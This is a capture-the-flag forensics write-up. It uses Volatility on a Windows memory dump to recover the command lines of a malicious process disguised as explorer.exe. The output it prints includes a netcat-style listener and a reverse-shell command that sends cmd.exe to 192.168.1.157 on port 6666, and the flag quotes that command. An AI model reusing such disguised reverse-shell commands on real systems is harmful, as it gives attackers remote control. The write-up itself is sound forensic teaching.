# Commands

![Forensics](https://img.shields.io/badge/Forensics--blueviolet?style=for-the-badge) ![Points - 100](https://img.shields.io/badge/Points-100-9cf?style=for-the-badge)

```txt
What was the command used with the malicious explorer.exe? Submit the entire command as the flag: flag{program.exe --options argument}.

Use the file from Captured Memories.
```

---

_You should probably take a look at [`Evil Twin`](../Evil%20Twin/README.md) before reading through this._

Ok, this challenge shouldn't be too hard, right? Simply take the PID of the imposter `explorer.exe`, use it in the `cmdline` command and _boom_ we're golden? - right? ... well... not quite... 

```bash
python2.7 vol.py -f mem.raw --profile=Win10x64_15063 cmdline -p 5448
```

```txt
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
explorer.exe pid:   5448
Command line : explorer.exe  -lnvp 6666
```

... while you can try and submit the output above as the flag. It won't work! ^^ This, at least for us, was the cause of some confusion at first, however, as it turns out, there another instance of the imposter `explorer.exe` was running at the time of the memory dump.

Using the `pstree` command like we did before, you can see it directly underneath the first instance. It's this process' command line you want to get.

```bash
python2.7 vol.py -f mem.raw --profile=Win10x64_15063 pstree
```

```txt
...    ...    ...    ... ...
... 0xffff878691456080:cmd.exe                       3944   4448      0 ------ 2020-06-26 15:37:19 UTC+0000
.... 0xffff87868fd63580:conhost.exe                  5432   3944      4      0 2020-06-26 15:37:19 UTC+0000
.... 0xffff878691762080:explorer.exe                 5448   3944      1      0 2020-06-26 15:43:14 UTC+0000
... 0xffff878691457580:cmd.exe                       4424   4448      1      0 2020-06-26 15:46:51 UTC+0000
.... 0xffff87868f773080:explorer.exe                 3100   4424      5      0 2020-06-26 15:48:21 UTC+0000
..... 0xffff87868f77b340:cmd.exe                     4640   3100      1      0 2020-06-26 15:48:21 UTC+0000
.... 0xffff87868f998080:conhost.exe                  6372   4424      3      0 2020-06-26 15:46:51 UTC+0000
                                                      ...    ...    ...    ... ...
```

So, just use the `cmdline` command on this PID (`3100`) ... and ... this time you get the correct commandline:

```bash
python2.7 vol.py -f mem.raw --profile=Win10x64_15063 cmdline -p 3100
```

```txt
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
explorer.exe pid:   3100
Command line : explorer.exe  192.168.1.157 6666 -e cmd.exe
```

The flag eventually was: `flag{explorer.exe 192.168.1.157 6666 -e cmd.exe}`
